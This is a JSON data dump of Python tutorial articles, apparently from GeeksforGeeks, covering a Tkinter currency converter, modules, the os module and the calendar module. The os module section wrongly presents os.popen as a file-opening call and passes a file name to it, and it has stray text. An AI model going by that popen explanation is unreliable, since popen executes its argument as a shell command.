widget\u00a0\u00a0\u00a0\u00a0# returns current text\u00a0 as a\u00a0\u00a0\u00a0\u00a0# string from text entry box.\u00a0\u00a0\u00a0\u00a0amount = float(Amount1_field.get())\u00a0\u00a0\u00a0\u00a0\u00a0# calculation for the conversion\u00a0\u00a0\u00a0\u00a0new_amount = round(amount * Exchange_Rate, 3)\u00a0\u00a0\u00a0\u00a0\u00a0# insert method inserting the\u00a0\u00a0\u00a0\u00a0# value in the text entry box.\u00a0\u00a0\u00a0\u00a0Amount2_field.insert(0, str(new_amount))\u00a0\u00a0# Function for clearing the Entry fielddef clear_all() :\u00a0\u00a0\u00a0\u00a0Amount1_field.delete(0, END)\u00a0\u00a0\u00a0\u00a0Amount2_field.delete(0, END)\u00a0\u00a0\u00a0\u00a0\u00a0# Driver codeif __name__ == \"__main__\" :\u00a0\u00a0\u00a0\u00a0\u00a0# Set the background colour of GUI window\u00a0\u00a0\u00a0\u00a0root.configure(background = 'light green')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Set the configuration of GUI window (WidthxHeight)\u00a0\u00a0\u00a0\u00a0root.geometry(\"400x175\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Create welcome to Real Time Currency Convertor label\u00a0\u00a0\u00a0\u00a0headlabel = Label(root, text = 'welcome to Real Time Currency Convertor',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0fg = 'black', bg = \"red\")\u00a0\u00a0\u00a0\u00a0\u00a0# Create a \"Amount :\" label\u00a0\u00a0\u00a0\u00a0label1 = Label(root, text = \"Amount :\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0fg = 'black', bg = 'dark green')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Create a \"From Currency :\" label\u00a0\u00a0\u00a0\u00a0label2 = Label(root, text = \"From Currency\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0fg = 'black', bg = 'dark green')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Create a \"To Currency: \" label\u00a0\u00a0\u00a0\u00a0label3 = Label(root, text = \"To Currency :\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0fg = 'black', bg = 'dark green')\u00a0\u00a0\u00a0\u00a0\u00a0# Create a \"Converted Amount :\" label\u00a0\u00a0\u00a0\u00a0label4 = Label(root, text = \"Converted Amount :\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0fg = 'black', bg = 'dark green')\u00a0\u00a0\u00a0\u00a0\u00a0# grid method is used for placing\u00a0\u00a0\u00a0\u00a0# the widgets at respective positions\u00a0\u00a0\u00a0\u00a0# in table like structure .\u00a0\u00a0\u00a0\u00a0\u00a0headlabel.grid(row = 0, column = 1)\u00a0\u00a0\u00a0\u00a0label1.grid(row = 1, column = 0)\u00a0\u00a0\u00a0\u00a0label2.grid(row = 2, column = 0)\u00a0\u00a0\u00a0\u00a0label3.grid(row = 3, column = 0)\u00a0\u00a0\u00a0\u00a0label4.grid(row = 5, column = 0)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Create a text entry box\u00a0\u00a0\u00a0\u00a0# for filling or typing the information.\u00a0\u00a0\u00a0\u00a0Amount1_field = Entry(root)\u00a0\u00a0\u00a0\u00a0Amount2_field = Entry(root)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# ipadx keyword argument set width of entry space.\u00a0\u00a0\u00a0\u00a0Amount1_field.grid(row = 1, column = 1, ipadx =\"25\")\u00a0\u00a0\u00a0\u00a0Amount2_field.grid(row = 5, column = 1, ipadx =\"25\")\u00a0\u00a0\u00a0\u00a0\u00a0# list of currency codes\u00a0\u00a0\u00a0\u00a0CurrenyCode_list = [\"INR\", \"USD\", \"CAD\", \"CNY\", \"DKK\", \"EUR\"]\u00a0\u00a0\u00a0\u00a0\u00a0# create a drop down menu using OptionMenu function\u00a0\u00a0\u00a0\u00a0# which takes window name, variable and choices as\u00a0\u00a0\u00a0\u00a0# an argument. use * before the name of the list,\u00a0\u00a0\u00a0\u00a0# to unpack the values\u00a0\u00a0\u00a0\u00a0FromCurrency_option = OptionMenu(root, variable1, *CurrenyCode_list)\u00a0\u00a0\u00a0\u00a0ToCurrency_option = OptionMenu(root, variable2, *CurrenyCode_list)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0FromCurrency_option.grid(row = 2, column = 1, ipadx = 10)\u00a0\u00a0\u00a0\u00a0ToCurrency_option.grid(row = 3, column = 1, ipadx = 10)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Create a Convert Button and attached\u00a0\u00a0\u00a0\u00a0# with RealTimeCurrencyExchangeRate function\u00a0\u00a0\u00a0\u00a0button1 = Button(root, text = \"Convert\", bg = \"red\", fg = \"black\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command = RealTimeCurrencyConversion)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0button1.grid(row = 4, column = 1)\u00a0\u00a0\u00a0\u00a0\u00a0# Create a Clear Button and attached\u00a0\u00a0\u00a0\u00a0# with delete function\u00a0\u00a0\u00a0\u00a0button2 = Button(root, text = \"Clear\", bg = \"red\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0fg = \"black\", command = clear_all)\u00a0\u00a0\u00a0\u00a0button2.grid(row = 6, column = 1)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Start the GUI\u00a0\u00a0\u00a0\u00a0root.mainloop()Output :\u00a0\u00a0\u00a0\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "70363bb5b1f40d447d1cff0acec4d7ef",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "A Python module is a file containing Python definitions and statements. A module can define functions, classes, and variables. A module can also include runnable code. Grouping related code into a module makes the code easier to understand and use. It also makes the code logically organized.Example: create a simple modulePython3# A simple module, calc.py\u00a0def add(x, y):\u00a0\u00a0\u00a0\u00a0return (x+y)\u00a0def subtract(x, y):\u00a0\u00a0\u00a0\u00a0return (x-y)Import Module in Python \u2013 \u00a0Import statementWe can import the functions, classes defined in a module to another module using the import statement in some other Python source file.\u00a0Syntax:import moduleWhen the interpreter encounters an import statement, it imports the module if the module is present in the search path. A search path is a list of directories that the interpreter searches for importing a module. For example, to import the module calc.py, we need to put the following command at the top of the script.Note: This does not import the functions or classes directly instead imports the module only. To access the functions inside the module the dot(.) operator is used.Example: Importing modules in PythonPython3# importing\u00a0 module calc.pyimport calc\u00a0print(calc.add(10, 2))Output:12The from import Statement\u00a0Python\u2019s from statement lets you import specific attributes from a module without importing the module as a whole.Example: Importing specific attributes from the modulePython3# importing sqrt() and factorial from the# module mathfrom math import sqrt, factorial\u00a0# if we simply do \"import math\", then# math.sqrt(16) and math.factorial()# are required.print(sqrt(16))print(factorial(6))Output:\u00a04.0\n720Import all Names \u2013 From import * \u00a0StatementThe * symbol used with the from import statement is used to import all the names from a module to a current namespace.Syntax:from module_name import *The use of * has its advantages and disadvantages. If you know exactly what you will be needing from the module, it is not recommended to use *, else do so.Example: Importing all namesPython3# importing sqrt() and factorial from the# module mathfrom math import *\u00a0# if we simply do \"import math\", then# math.sqrt(16) and math.factorial()# are required.print(sqrt(16))print(factorial(6))Output4.0\n720Locating ModulesWhenever a module is imported in Python the interpreter looks for several locations. First, it will check for the built-in module, if not found then it looks for a list of directories defined in the sys.path. Python interpreter searches for the module in the following manner \u2013First, it searches for the module in the current directory.If the module isn\u2019t found in the current directory, Python then searches each directory in the shell variable PYTHONPATH. The PYTHONPATH is an environment variable, consisting of a list of directories.If that also fails python checks the installation-dependent list of directories configured at the time Python is installed.Example: Directories List for ModulesPython3# importing sys moduleimport sys\u00a0# importing sys.pathprint(sys.path)Output:[\u2018/home/nikhil/Desktop/gfg\u2019, \u2018/usr/lib/python38.zip\u2019, \u2018/usr/lib/python3.8\u2019, \u2018/usr/lib/python3.8/lib-dynload\u2019, \u201d, \u2018/home/nikhil/.local/lib/python3.8/site-packages\u2019, \u2018/usr/local/lib/python3.8/dist-packages\u2019, \u2018/usr/lib/python3/dist-packages\u2019, \u2018/usr/local/lib/python3.8/dist-packages/IPython/extensions\u2019, \u2018/home/nikhil/.ipython\u2019]Importing and renaming moduleWe can rename the module while importing it using the as keyword.\u00a0Example: Renaming the modulePython3# importing sqrt() and factorial from the# module mathimport math as gfg\u00a0# if we simply do \"import math\", then# math.sqrt(16) and math.factorial()# are required.print(gfg.sqrt(16))print(gfg.factorial(6))Output4.0\n720The dir() functionThe dir() built-in function returns a sorted list of strings containing the names defined by a module. The list contains the names of all the modules, variables, and functions that are defined in a module.Python3#\u00a0 Import built-in module\u00a0 randomimport\u00a0 randomprint(dir(random))\u00a0\u00a0Output:\u00a0[\u2018BPF\u2019, \u2018LOG4\u2019, \u2018NV_MAGICCONST\u2019, \u2018RECIP_BPF\u2019, \u2018Random\u2019, \u2018SG_MAGICCONST\u2019, \u2018SystemRandom\u2019, \u2018TWOPI\u2019, \u2018_BuiltinMethodType\u2019, \u2018_MethodType\u2019, \u2018_Sequence\u2019, \u2018_Set\u2019, \u2018__all__\u2019, \u2018__builtins__\u2019, \u2018__cached__\u2019, \u2018__doc__\u2019, \u2018__file__\u2019, \u2018__loader__\u2019, \u2018__name__\u2019, \u2018__package__\u2019, \u2018__spec__\u2019, \u2018_acos\u2019, \u2018_bisect\u2019, \u2018_ceil\u2019, \u2018_cos\u2019, \u2018_e\u2019, \u2018_exp\u2019, \u2018_inst\u2019, \u2018_itertools\u2019, \u2018_log\u2019, \u2018_pi\u2019, \u2018_random\u2019, \u2018_sha512\u2019, \u2018_sin\u2019, \u2018_sqrt\u2019, \u2018_test\u2019, \u2018_test_generator\u2019, \u2018_urandom\u2019, \u2018_warn\u2019, \u2018betavariate\u2019, \u2018choice\u2019, \u2018choices\u2019, \u2018expovariate\u2019, \u2018gammavariate\u2019, \u2018gauss\u2019, \u2018getrandbits\u2019, \u2018getstate\u2019, \u2018lognormvariate\u2019, \u2018normalvariate\u2019, \u2018paretovariate\u2019, \u2018randint\u2019, \u2018random\u2019, \u2018randrange\u2019, \u2018sample\u2019, \u2018seed\u2019, \u2018setstate\u2019, \u2018shuffle\u2019, \u2018triangular\u2019, \u2018uniform\u2019, \u2018vonmisesvariate\u2019, \u2018weibullvariate\u2019]Code Snippet illustrating python built-in modules:\u00a0\u00a0Python3# importing built-in module mathimport math\u00a0# using square root(sqrt) function contained# in math moduleprint(math.sqrt(25))\u00a0# using pi function contained in math moduleprint(math.pi)\u00a0# 2 radians = 114.59 degreesprint(math.degrees(2))\u00a0\u00a0# 60 degrees = 1.04 radiansprint(math.radians(60))\u00a0\u00a0# Sine of 2 radiansprint(math.sin(2))\u00a0\u00a0# Cosine of 0.5 radiansprint(math.cos(0.5))\u00a0\u00a0# Tangent of 0.23 radiansprint(math.tan(0.23))\u00a0# 1 * 2 * 3 * 4 = 24print(math.factorial(4))\u00a0\u00a0# importing built in module randomimport random\u00a0# printing random integer between 0 and 5print(random.randint(0, 5))\u00a0\u00a0# print random floating point number between 0 and 1print(random.random())\u00a0\u00a0# random number between 0 and 100print(random.random() * 100)\u00a0\u00a0List = [1, 4, True, 800, \"python\", 27, \"hello\"]\u00a0# using choice function in random module for choosing# a random element from a set such as a listprint(random.choice(List))\u00a0\u00a0# importing built in module datetimeimport datetimefrom datetime import dateimport time\u00a0# Returns the number of seconds since the# Unix Epoch, January 1st 1970print(time.time())\u00a0\u00a0# Converts a number of seconds to a date objectprint(date.fromtimestamp(454554))\u00a0Output:5.0\n3.14159265359\n114.591559026\n1.0471975512\n0.909297426826\n0.87758256189\n0.234143362351\n24\n3\n0.401533172951\n88.4917616788\nTrue\n1461425771.87\n1970-01-06\u00a0This article is contributed by Gaurav Shrestha. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "a93c22896d0e6cb0e3cc092bc182889f",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "The OS module in Python provides functions for interacting with the operating system. OS comes under Python\u2019s standard utility modules. This module provides a portable way of using operating system-dependent functionality. The *os* and *os.path* modules include many functions to interact with the file system.\u00a0Handling the Current Working DirectoryConsider Current Working Directory(CWD) as a folder, where the Python is operating. Whenever the files are called only by their name, Python assumes that it starts in the CWD which means that name-only reference will be successful only if the file is in the Python\u2019s CWD.Note: The folder where the Python script is running is known as the Current Directory. This is not the path where the Python script is located.Getting the Current working directoryTo get the location of the current working directory os.getcwd() is used.\u00a0Example:Python3# Python program to explain os.getcwd() method\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# importing os moduleimport os\u00a0\u00a0\u00a0\u00a0\u00a0# Get the current working# directory (CWD)cwd = os.getcwd()\u00a0\u00a0\u00a0\u00a0\u00a0# Print the current working# directory (CWD)print(\"Current working directory:\", cwd)Output:Current working directory: /home/nikhil/Desktop/gfgChanging the Current working directoryTo change the current working directory(CWD) os.chdir() method is used. This method changes the CWD to a specified path. It only takes a single argument as a new directory path.\u00a0Note: The current working directory is the folder in which the Python script is operating.\u00a0Example:Python3# Python program to change the# current working directory\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0import os\u00a0\u00a0\u00a0# Function to Get the current\u00a0# working directorydef current_path():\u00a0\u00a0\u00a0\u00a0print(\"Current working directory before\")\u00a0\u00a0\u00a0\u00a0print(os.getcwd())\u00a0\u00a0\u00a0\u00a0print()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Driver's code# Printing CWD beforecurrent_path()\u00a0\u00a0\u00a0# Changing the CWDos.chdir('../')\u00a0\u00a0\u00a0# Printing CWD aftercurrent_path()Output:Current working directory before\nC:\\Users\\Nikhil Aggarwal\\Desktop\\gfg\n\nCurrent working directory after\nC:\\Users\\Nikhil Aggarwal\\Desktop\u00a0Creating a DirectoryThere are different methods available in the OS module for creating a directory. These are \u2013os.mkdir()os.makedirs()Using os.mkdir()os.mkdir() method in Python is used to create a directory named path with the specified numeric mode. This method raises FileExistsError if the directory to be created already exists.\u00a0Example:\u00a0Python3# Python program to explain os.mkdir() method\u00a0# importing os moduleimport os\u00a0# Directorydirectory = \"GeeksforGeeks\"\u00a0# Parent Directory pathparent_dir = \"D:/Pycharm projects/\"\u00a0# Pathpath = os.path.join(parent_dir, directory)\u00a0# Create the directory# 'GeeksForGeeks' in# '/home / User / Documents'os.mkdir(path)print(\"Directory '% s' created\" % directory)\u00a0# Directorydirectory = \"Geeks\"\u00a0# Parent Directory pathparent_dir = \"D:/Pycharm projects\"\u00a0# modemode = 0o666\u00a0# Pathpath = os.path.join(parent_dir, directory)\u00a0# Create the directory# 'GeeksForGeeks' in# '/home / User / Documents'# with mode 0o666os.mkdir(path, mode)print(\"Directory '% s' created\" % directory)Output:Directory 'GeeksforGeeks' created\nDirectory 'Geeks' createdUsing os.makedirs()os.makedirs() method in Python is used to create a directory recursively. That means while making leaf directory if any intermediate-level directory is missing, os.makedirs() method will create them all.\u00a0Example:\u00a0Python3# Python program to explain os.makedirs() method\u00a0\u00a0\u00a0\u00a0\u00a0# importing os moduleimport os\u00a0\u00a0\u00a0\u00a0\u00a0# Leaf directorydirectory = \"Nikhil\"\u00a0\u00a0\u00a0\u00a0\u00a0# Parent Directoriesparent_dir = \"D:/Pycharm projects/GeeksForGeeks/Authors\"\u00a0\u00a0\u00a0\u00a0\u00a0# Pathpath = os.path.join(parent_dir, directory)\u00a0\u00a0\u00a0\u00a0\u00a0# Create the directory# 'Nikhil'os.makedirs(path)print(\"Directory '% s' created\" % directory)\u00a0\u00a0\u00a0\u00a0\u00a0# Directory 'GeeksForGeeks' and 'Authors' will# be created too# if it does not exists\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Leaf directorydirectory = \"c\"\u00a0\u00a0\u00a0\u00a0\u00a0# Parent Directoriesparent_dir = \"D:/Pycharm projects/GeeksforGeeks/a/b\"\u00a0\u00a0\u00a0\u00a0\u00a0# modemode = 0o666\u00a0\u00a0\u00a0\u00a0\u00a0path = os.path.join(parent_dir, directory)\u00a0\u00a0\u00a0\u00a0\u00a0# Create the directory 'c'\u00a0\u00a0\u00a0\u00a0\u00a0os.makedirs(path, mode)print(\"Directory '% s' created\" % directory)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# 'GeeksForGeeks', 'a', and 'b'# will also be created if# it does not exists\u00a0\u00a0\u00a0\u00a0\u00a0# If any of the intermediate level# directory is missing# os.makedirs() method will# create them\u00a0\u00a0\u00a0\u00a0\u00a0# os.makedirs() method can be# used to create a directory treeOutput:Directory 'Nikhil' created\nDirectory 'c' createdListing out Files and Directories with Pythonos.listdir() method in Python is used to get the list of all files and directories in the specified directory. If we don\u2019t specify any directory, then the list of files and directories in the current working directory will be returned.\u00a0Example:Python3# Python program to explain os.listdir() method\u00a0\u00a0\u00a0\u00a0\u00a0# importing os moduleimport os\u00a0# Get the list of all files and directories# in the root directorypath = \"/\"dir_list = os.listdir(path)\u00a0print(\"Files and directories in '\", path, \"' :\")\u00a0# print the listprint(dir_list)Output:Files and directories in ' / ' :\n['sys', 'run', 'tmp', 'boot', 'mnt', 'dev', 'proc', 'var', 'bin', 'lib64', 'usr', \n'lib', 'srv', 'home', 'etc', 'opt', 'sbin', 'media']\u00a0Deleting Directory or Files using PythonOS module proves different methods for removing directories and files in Python. These are \u2013\u00a0Using os.remove()Using os.rmdir()Using os.remove()os.remove() method in Python is used to remove or delete a file path. This method can not remove or delete a directory. If the specified path is a directory then OSError will be raised by the method.\u00a0Example: Suppose the file contained in the folder are:\u00a0Python3# Python program to explain os.remove() method\u00a0\u00a0\u00a0\u00a0\u00a0# importing os moduleimport os\u00a0\u00a0\u00a0\u00a0\u00a0# File namefile = 'file1.txt'\u00a0\u00a0\u00a0\u00a0\u00a0# File locationlocation = \"D:/Pycharm projects/GeeksforGeeks/Authors/Nikhil/\"\u00a0\u00a0\u00a0\u00a0\u00a0# Pathpath = os.path.join(location, file)\u00a0\u00a0\u00a0\u00a0\u00a0# Remove the file# 'file.txt'os.remove(path)e)Output:Using os.rmdir()os.rmdir() method in Python is used to remove or delete an empty directory. OSError will be raised if the specified path is not an empty directory.\u00a0Example: Suppose the directories are\u00a0Python3# Python program to explain os.rmdir() method\u00a0\u00a0\u00a0\u00a0\u00a0# importing os moduleimport os\u00a0\u00a0\u00a0\u00a0\u00a0# Directory namedirectory = \"Geeks\"\u00a0\u00a0\u00a0\u00a0\u00a0# Parent Directoryparent = \"D:/Pycharm projects/\"\u00a0\u00a0\u00a0\u00a0\u00a0# Pathpath = os.path.join(parent, directory)\u00a0\u00a0\u00a0\u00a0\u00a0# Remove the Directory# \"Geeks\"os.rmdir(path)Output:\u00a0Commonly Used Functions1. os.name: This function gives the name of the operating system dependent module imported. The following names have currently been registered: \u2018posix\u2019, \u2018nt\u2019, \u2018os2\u2019, \u2018ce\u2019, \u2018java\u2019 and \u2018riscos\u2019.Python3import os\u00a0print(os.name)Output:posixNote: It may give different output on different interpreters, such as \u2018posix\u2019 when you run the code here.\u00a02. os.error: All functions in this module raise OSError in the case of invalid or inaccessible file names and paths, or other arguments that have the correct type, but are not accepted by the operating system. os.error is an alias for built-in OSError exception.\u00a0Python3import os\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0# If the file does not exist,\u00a0\u00a0\u00a0\u00a0# then it would throw an IOError\u00a0\u00a0\u00a0\u00a0filename = 'GFG.txt'\u00a0\u00a0\u00a0\u00a0f = open(filename, 'rU')\u00a0\u00a0\u00a0\u00a0text = f.read()\u00a0\u00a0\u00a0\u00a0f.close()\u00a0# Control jumps directly to here if# any of the above lines throws IOError.\u00a0\u00a0\u00a0except IOError:\u00a0\u00a0\u00a0\u00a0\u00a0# print(os.error) will <class 'OSError'>\u00a0\u00a0\u00a0\u00a0print('Problem reading: ' + filename)\u00a0\u00a0\u00a0\u00a0\u00a0# In any case, the code then continues with# the line after the try/exceptOutput:\u00a0Problem reading: GFG.txt\u00a03. os.popen(): This method opens a pipe to or from command. The return value can be read or written depending on whether the mode is \u2018r\u2019 or \u2018w\u2019.\u00a0Syntax:\u00a0 os.popen(command[, mode[, bufsize]])Parameters mode & bufsize are not necessary parameters, if not provided, default \u2018r\u2019 is taken for mode.\u00a0Python3import osfd = \"GFG.txt\"\u00a0# popen() is similar to open()file = open(fd, 'w')file.write(\"Hello\")file.close()file = open(fd, 'r')text = file.read()print(text)\u00a0# popen() provides a pipe/gateway and accesses the file directlyfile = os.popen(fd, 'w')file.write(\"Hello\")# File not closed, shown in next function.Output:\u00a0HelloNote: Output for popen() will not be shown, there would be direct changes into the file.\u00a04. os.close(): Close file descriptor fd. A file opened using open(), can be closed by close()only. But file opened through os.popen(), can be closed with close() or os.close(). If we try closing a file opened with open(), using os.close(), Python would throw TypeError.\u00a0Python3import os\u00a0\u00a0fd = \"GFG.txt\"file = open(fd, 'r')text = file.read()print(text)os.close(file)Output:\u00a0Traceback (most recent call last):\n  File \"C:\\Users\\GFG\\Desktop\\GeeksForGeeksOSFile.py\", line 6, in \n    os.close(file)\nTypeError: an integer is required (got type _io.TextIOWrapper)Note: The same error may not be thrown, due to the non-existent file or permission privilege.\u00a05. os.rename(): A file old.txt can be renamed to new.txt, using the function os.rename(). The name of the file changes only if, the file exists and the user has sufficient privilege permission to change the file.Pythonimport os\u00a0\u00a0fd = \"GFG.txt\"os.rename(fd,'New.txt')os.rename(fd,'New.txt')Output:Traceback (most recent call last):\n  File \"C:\\Users\\GFG\\Desktop\\ModuleOS\\GeeksForGeeksOSFile.py\", line 3, in \n    os.rename(fd,'New.txt')\nFileNotFoundError: [WinError 2] The system cannot find the\nfile specified: 'GFG.txt' -> 'New.txt'Understanding the Output: A file name \u201cGFG.txt\u201d exists, thus when os.rename() is used the first time, the file gets renamed. Upon calling the function os.rename() second time, file \u201cNew.txt\u201d exists and not \u201cGFG.txt\u201d\u00a0thus Python throws FileNotFoundError.\u00a0\u00a06. os.remove(): Using the Os module we can remove a file in our system using the remove() method. To remove a file we need to pass the name of the file as a parameter.\u00a0Python3import os #importing os module.\u00a0os.remove(\"file_name.txt\") #removing the file.The OS module provides us a layer of abstraction between us and the operating system. When we are working with os module always specify the absolute path depending upon the operating system the code can run on any os but we need to change the path exactly. If you try to remove a file that does not exist you will get FileNotFoudError.\u00a07. os.path.exists(): This method will check whether a file exists or not by passing the name of the file as a parameter. OS module has a sub-module named PATH by using which we can perform many more functions.\u00a0Python3import os#importing os module\u00a0result = os.path.exists(\"file_name\") #giving the name of the file as a parameter.\u00a0print(result)OutputFalseAs in the above code, the file does not exist it will give output False. If the file exists it will give us output True.\u00a08. os.path.getsize(): In this method, python will give us the size of the file in bytes. To use this method we need to pass the name of the file as a parameter.Python3import os #importing os module\u00a0size = os.path.getsize(\"filename\")\u00a0print(\"Size of the file is\", size,\" bytes.\")Output:Size of the file is 192 bytes.This article is contributed by Piyush Doorwar. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "033098ff93efebf71bef9b6c9c38783e",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python defines an inbuilt module calendar that handles operations related to the calendar.\u00a0The calendar module allows output calendars like the program and provides additional useful functions related to the calendar. Functions and classes defined in the Calendar module use an idealized calendar, the current Gregorian calendar extended indefinitely in both directions. By default, these calendars have Monday as the first day of the week, and Sunday as the last (the European convention).Example #1: Display the Calendar of a given month.\u00a0Python3# Python program to display calendar of# given month of the year\u00a0\u00a0\u00a0# import moduleimport calendar\u00a0\u00a0\u00a0yy = 2017mm = 11\u00a0\u00a0\u00a0# display the calendarprint(calendar.month(yy, mm))Output:\u00a0\u00a0Example #2: Display calendar of the given year.\u00a0Python3# Python code to demonstrate the working of# calendar() function to print calendar\u00a0\u00a0\u00a0# importing calendar module# for calendar operationsimport calendar\u00a0\u00a0\u00a0# using calendar to print calendar of year# prints calendar of 2018print (\"The calendar of year 2018 is : \")print (calendar.calendar(2018, 2, 1, 6))Output:\u00a0\u00a0\u00a0\u00a0class calendar.Calendar :\u00a0The calendar class creates a Calendar object. A Calendar object provides several methods that can be used for preparing the calendar data for formatting. This class doesn\u2019t do any formatting itself. This is the job of subclasses. Calendar class allows the calculations for various tasks based on date, month, and year. Calendar class provides the following methods:\u00a0FunctionDescriptioniterweekdays()Returns an iterator for the week day numbers that will be used for one weekitermonthdates()Returns an iterator for the month (1\u201312) in the yearitermonthdays()Returns an iterator of a specified month and a yearitermonthdays2()Method is used to get an iterator for the month in the year similar to itermonthdates(). Days returned will be tuples consisting of a day of the month number and a week day number.itermonthdays3()Returns an iterator for the month in the year similar to itermonthdates(), but not restricted by the datetime.date range. Days returned will be tuples consisting of a year, a month and a day of the month numbers.itermonthdays4()Returns an iterator for the month in the year similar to itermonthdates(), but not restricted by the datetime.date range. Days returned will be tuples consisting of a year, a month, a day of the month, and a day of the week numbers.monthdatescalendar()Used to get a list of the weeks in the month of the year as full weeksmonthdays2calendar()Used to get a list of the weeks in the month of the year as full weeksmonthdayscalendarUsed to get a list of the weeks in the month of the year as full weeksyeardatescalendar()Used to get a list of the weeks in the month of the year as full weeksyeardays2calendar()Used to get the data for specified year. Entries in the week lists are tuples of day numbers and weekday numbersyeardayscalendar()Used to get the data for specified year. Entries in the week lists are day numbers\u00a0\u00a0class calendar.TextCalendar :\u00a0TextCalendar class can be used to generate plain text calendars. TextCalendar class in Python allows you to edit the calendar and use it as per your requirement.\u00a0\u00a0FunctionDescriptionformatmonth()Method is used to get month\u2019s calendar in a multi-line stringprmonth()Method is used to print a month\u2019s calendar as returned by formatmonth()formatyear()Method is used to get m-column calendar for an entire year as a multi-line stringpryear()Method is used to print the calendar for an entire year as returned by formatmonth()\u00a0\u00a0class calendar.HTMLCalendar :\u00a0HTMLCalendar class can be used to generate HTML calendars. HTMLCalendar class in Python allows you to edit the calendar and use as per your requirement.\u00a0\u00a0FunctionDescriptionformatmonth()Method is used to get month\u2019s calendar as an HTML tableformatyear()Method is used to get year\u2019s calendar as an HTML table.formatyearpage()Method is used to get year\u2019s calendar as a complete HTML page\u00a0\u00a0Simple TextCalendar class :For simple text calendars calendar module provides the following functions :\u00a0\u00a0FunctionDescriptionsetfirstweekday()Function sets the day start number of weekfirstweekday()Function returns the first week day number. By default 0 (Monday)isleap()Function checks if year mentioned in argument is leap or notleapdays()Function returns the number of leap days between the specified years in argumentsweekday()Function returns the week day number(0 is Monday) of the date specified in its argumentsweekheader()Returns a header containing abbreviated weekday namesmonthrange()Function returns two integers, first, the starting day number of week(0 as monday), second, the number of days in the monthmonthcalendar()Returns a matrix representing a month\u2019s calendar. Each row represents a week; days outside of the month are represented by zerosprmonth()Function also prints the month of specific year but there is no need of \u201cprint\u201d operation to execute thismonth()Function prints the month of a specific year mentioned in argumentsprcal()Function also prints the calendar of specific year but there is no need of \u201cprint\u201d operation to execute thiscalendar()Function displays the year, width of characters, no. of lines per week and column separations.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "36a32eeb11dbf9d37ad3cdfb773b4b0b",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
